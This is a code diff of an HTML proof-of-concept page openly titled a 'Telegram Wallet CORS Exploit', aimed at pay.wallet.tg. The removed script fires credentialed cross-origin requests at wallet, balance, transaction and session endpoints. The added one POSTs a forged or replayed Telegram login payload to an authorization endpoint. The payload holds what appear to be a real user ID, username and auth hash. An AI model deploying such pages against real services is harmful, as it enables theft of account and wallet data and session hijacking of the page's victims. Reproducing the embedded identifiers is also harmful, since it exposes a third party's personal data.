@@ -1,34 +1,30 @@
-<script>
-const endpoints = [
-  "/api/v1/users/me",
-  "/api/v1/wallet",
-  "/api/v1/balance",
-  "/api/v1/transactions",
-  "/api/v1/profile",
-  "/api/v1/userinfo",
-  "/api/v1/auth/session",
-  "/api/v1/accounts"
-];
-
-const base = "https://pay.wallet.tg";
-
-async function testAll() {
-  for (let path of endpoints) {
-    try {
-      const res = await fetch(base + path, {
-        method: "GET",
-        credentials: "include"
-      });
-
-      const text = await res.text();
-      console.log(`\n[${path}]`);
-      console.log("Status:", res.status);
-      console.log("Body:", text.slice(0, 300)); // Print preview
-    } catch (err) {
-      console.error(`[${path}] ERROR:`, err.message);
-    }
-  }
-}
-</script>
-
-<button onclick="testAll()">Run Endpoint Scan</button>
+<!DOCTYPE html>
+<html>
+  <head><title>Telegram Wallet CORS Exploit</title></head>
+  <body>
+    <h2>Exploit: Send Telegram Login Payload</h2>
+    <button onclick="exploit()">Exploit</button>
+    <script>
+      function exploit() {
+        fetch("https://pay.wallet.tg/api/v1/users/authorize_by_telegram/", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            id: 7793424216,
+            first_name: "Ruben",
+            last_name: "H1",
+            username: "Username21_rd",
+            auth_date: 1752079801,
+            hash: "0286a9d09b7470311e0260db1d01596fbc9418d3e50e61630ea60adbee9b85f5"
+          })
+        })
+        .then(res => res.text())
+        .then(data => alert("Response:\n" + data))
+        .catch(err => alert("Error:\n" + err));
+      }
+    </script>
+  </body>
+</html>
